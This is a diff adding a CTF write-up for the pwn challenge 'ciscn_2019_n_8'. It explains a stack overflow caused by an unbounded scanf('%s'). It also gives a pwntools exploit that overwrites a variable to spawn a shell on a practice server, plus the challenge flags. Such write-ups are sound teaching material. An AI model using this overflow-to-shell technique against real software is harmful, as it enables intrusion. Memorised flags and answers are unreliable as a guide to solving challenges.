@@ -696,3 +696,111 @@ if __name__ == "__main__":
 ## Flag
 
 Flag: `flag{b3e65f27-e5ed-4763-a83b-d582ac37b3ea}`
+
+# ciscn_2019_n_8
+
+## Information
+
+- Category: Pwn
+- Points: 1
+
+## Write-up
+
+```c ins={11-14} del={10}
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [esp-14h] [ebp-20h]
+  int v5; // [esp-10h] [ebp-1Ch]
+
+  var[13] = 0;
+  var[14] = 0;
+  init();
+  puts("What's your name?");
+  __isoc99_scanf("%s", var, v4, v5);
+  if ( *(_QWORD *)&var[13] )
+  {
+    if ( *(_QWORD *)&var[13] == 17LL )
+      system("/bin/sh");
+    else
+      printf(
+        "something wrong! val is %d",
+        var[0],
+        var[1],
+        var[2],
+        var[3],
+        var[4],
+        var[5],
+        var[6],
+        var[7],
+        var[8],
+        var[9],
+        var[10],
+        var[11],
+        var[12],
+        var[13],
+        var[14]);
+  }
+  else
+  {
+    printf("%s, Welcome!\n", var);
+    puts("Try do something~");
+  }
+  return 0;
+}
+```
+
+`__isoc99_scanf((int)"%s", (int)var, v4, v5);` 存在栈溢出漏洞，因为没有限制 `%s` 可以读取的字符数。这里 IDA 反编译出来多了两个无关的参数 `v4` 和 `v5`，直接忽视就好了。后面两个条件判断，第一个 `*(_QWORD *)&var[13]` 是将 `&var[13]` 处的八字节，解释成一个整数，看它的值是否为 `0`，不为零则进入下一个判断；`*(_QWORD *)&var[13] == 0x11LL`，看 `&var[13]` 这个地址处的八字节整数是否为 `0x11`，成立则 `getshell`。
+
+## Exploit
+
+```python
+#!/usr/bin/python
+
+from pwn import args, context, flat, gdb, p64, process, remote
+
+gdbscript = """
+b *main+100
+b *main+105
+c
+"""
+
+FILE = "./ciscn_2019_n_8"
+HOST, PORT = "node5.buuoj.cn", 29741
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+
+def launch():
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+    if args.D:
+        gdb.attach(target, gdbscript=gdbscript)
+
+    return target
+
+
+def construct_payload():
+    payload = flat(b"A" * 52, p64(0x11))
+
+    return payload
+
+
+def main():
+    target = launch()
+
+    payload = construct_payload()
+
+    target.sendline(payload)
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+Flag: `flag{e913a0b0-686a-4aec-a25e-503e2dc2d226}`
